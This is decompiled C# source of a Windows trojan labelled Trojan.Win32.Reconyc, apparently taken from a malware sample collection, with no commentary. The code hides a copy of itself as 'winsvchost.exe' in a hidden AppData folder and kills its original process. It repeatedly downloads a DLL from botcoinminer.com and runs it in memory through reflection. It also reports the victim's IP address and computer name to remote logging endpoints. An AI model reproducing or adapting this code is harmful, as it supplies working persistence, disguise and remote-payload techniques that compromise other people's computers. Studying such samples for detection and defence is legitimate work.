// Decompiled with JetBrains decompiler
// Type: TGKjXVPheBXvCx
// Assembly: cfd1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 62300CDF-5E77-4223-9AB4-F2911EC4E32F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.Win32.Reconyc.ehis-0c15e1888a32f78de715dcc76b42dcb688a82f44ea355fdeb9076ff7fbac2d3d.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

[StandardModule]
internal sealed class TGKjXVPheBXvCx
{
  public static string YrLGuajkinYS() => Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

  public static void yIJHMwpxbonE()
  {
    WebClient webClient = new WebClient();
    TGKjXVPheBXvCx.ZqFbOYvqUVCWbjZF(webClient.DownloadData("http://botcoinminer.com/MX/dll/XD.dll"), "iBGfegFgryejGyejr.BfielgFYwegrfiw", "ORYfbwIYVEwRFjbwrFgbwrigi", new object[1]
    {
      (object) "cfrrd"
    });
    TGKjXVPheBXvCx.ZqFbOYvqUVCWbjZF(webClient.DownloadData("http://botcoinminer.com/MX/dll/XD.dll"), "iBGfegFgryejGyejr.BfielgFYwegrfiw", "LIJVwieyfvwEJfwEIyfI", new object[1]
    {
      (object) "cfrrd"
    });
    Thread.Sleep(15000);
    try
    {
      GC.Collect();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    TGKjXVPheBXvCx.yIJHMwpxbonE();
  }

  [STAThread]
  public static void main()
  {
    try
    {
      if (!Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName.Contains(TGKjXVPheBXvCx.YrLGuajkinYS() + "\\Security\\"))
      {
        if (!Directory.Exists(TGKjXVPheBXvCx.YrLGuajkinYS() + "\\Security\\"))
          Directory.CreateDirectory(TGKjXVPheBXvCx.YrLGuajkinYS() + "\\Security\\");
        if (System.IO.File.Exists(TGKjXVPheBXvCx.YrLGuajkinYS() + "\\Security\\winsvchost.exe"))
        {
          try
          {
            System.IO.File.Delete(TGKjXVPheBXvCx.YrLGuajkinYS() + "\\Security\\winsvchost.exe");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        System.IO.File.Copy(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, TGKjXVPheBXvCx.YrLGuajkinYS() + "\\Security\\winsvchost.exe");
        System.IO.File.SetAttributes(TGKjXVPheBXvCx.YrLGuajkinYS() + "\\Security\\winsvchost.exe", FileAttributes.Hidden);
        new DirectoryInfo(TGKjXVPheBXvCx.YrLGuajkinYS() + "\\Security").Attributes = FileAttributes.Hidden;
        Interaction.Shell(TGKjXVPheBXvCx.YrLGuajkinYS() + "\\Security\\winsvchost.exe");
        Process[] processes = Process.GetProcesses();
        int index = 0;
        while (index < processes.Length)
        {
          Process process = processes[index];
          if (Operators.CompareString(process.ProcessName, MyProject.Computer.FileSystem.GetName(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName).Replace(".exe", string.Empty).Replace(".EXE", string.Empty), false) == 0)
          {
            try
            {
              process.Kill();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          checked { ++index; }
        }
      }
      else
      {
        try
        {
          FileSystem.Kill(Interaction.Command());
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      string str = "LN";
      WebClient webClient = new WebClient();
      if (!TGKjXVPheBXvCx.uzIxdmmlqNUbGT())
        TGKjXVPheBXvCx.ZqFbOYvqUVCWbjZF(webClient.DownloadData("http://botcoinminer.com/MX/dll/XD.dll"), "iBGfegFgryejGyejr.BfielgFYwegrfiw", "JGfwOGFRyweirgFWEIiW", new object[1]
        {
          (object) ("8ED1D8CFA0D7A1D5E1CBC4D0D7DBA5C197F38DBAA2BCC0CBDAF2F3F48E88988FF281AACACADA8D8C9ECBB384C0B8C7BDA1ABC6C7C6AAAFA083D3C4D1E5F784FF9DF9E380D2C8B4D8D0E9FE99EEB9C2C0E9B3B1F49F93E8EC938485EEEB899480928DF6#" + Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName + "##" + str)
        });
      new Thread(new ThreadStart(TGKjXVPheBXvCx.yIJHMwpxbonE)).Start();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex.ToString());
      ProjectData.ClearProjectError();
    }
  }

  public static bool uzIxdmmlqNUbGT()
  {
    Process[] processes = Process.GetProcesses();
    int index = 0;
    while (index < processes.Length)
    {
      if (Operators.CompareString(processes[index].ProcessName, "taskreg", false) == 0)
        return true;
      checked { ++index; }
    }
    return false;
  }

  public static string MgWNblUUHH()
  {
    try
    {
      return new WebClient().DownloadString("http://automation.whatismyip.com/n09230945.asp");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return "Error Retriving IP";
  }

  public static void fdXpmJsEJFR()
  {
    try
    {
      using (WebClient webClient = new WebClient())
        webClient.UploadString("/new.php?ip=" + TGKjXVPheBXvCx.MgWNblUUHH() + "&name=" + MyProject.Computer.Name, "");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void vgZgLlX(string nrtlLnSDxm)
  {
    try
    {
      using (WebClient webClient = new WebClient())
        webClient.UploadString("/log.php?action=" + TGKjXVPheBXvCx.MgWNblUUHH() + " - " + nrtlLnSDxm, "");
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void ZqFbOYvqUVCWbjZF(
    byte[] OPNSpvDhutKNQI,
    string gvoZHJdGLYV,
    string ERqqSanPjOmEeFQ,
    object[] KcLhRcie)
  {
    ((Assembly.Load(OPNSpvDhutKNQI).GetType(gvoZHJdGLYV) ?? throw new Exception("Class not found")).GetMethod(ERqqSanPjOmEeFQ) ?? throw new Exception("Method not found")).Invoke((object) null, KcLhRcie);
  }
}
